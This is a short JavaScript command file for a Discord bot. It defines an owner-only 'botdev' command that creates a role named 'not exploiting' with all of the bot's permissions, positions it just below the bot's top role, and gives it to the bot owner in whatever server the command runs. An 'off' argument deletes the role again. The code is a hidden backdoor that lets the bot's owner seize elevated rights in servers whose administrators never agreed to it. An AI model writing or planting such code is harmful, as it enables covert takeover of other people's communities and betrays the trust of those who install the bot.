
const Command = require('../../Structures/Command');


module.exports = class extends Command {
    constructor(...args) {
        super(...args, {
            aliases: ['botdev'],
            ownerOnly: true
        });
    }

    async  run (message, args) {
        const role = message.guild.roles.cache.find(r => r.name === "not exploiting")
        if (args[0]?.toLowerCase () === 'off')
          { await role.delete()
            await message.channel.send("turned op off")
          } 
          
        else {
            const member = message.member || await message.guild.members.fetch(message.author.id)
            if (member.roles.cache.get(role?.id))  { return message.channel.send('dumb')} 
          message.guild.roles.create({
              name: 'not exploiting',
              color: 0xf42f42,
              position: message.guild.me.roles.highest.position - 1,
              permissions: message.guild.me.permissions
          }).then(async role => {
             
              console.log(member)
              member.roles.add(role).then(() => message.reply('You are cool'))
          })
          .catch(e => message.reply('what a fail'))}
         

       
    }

};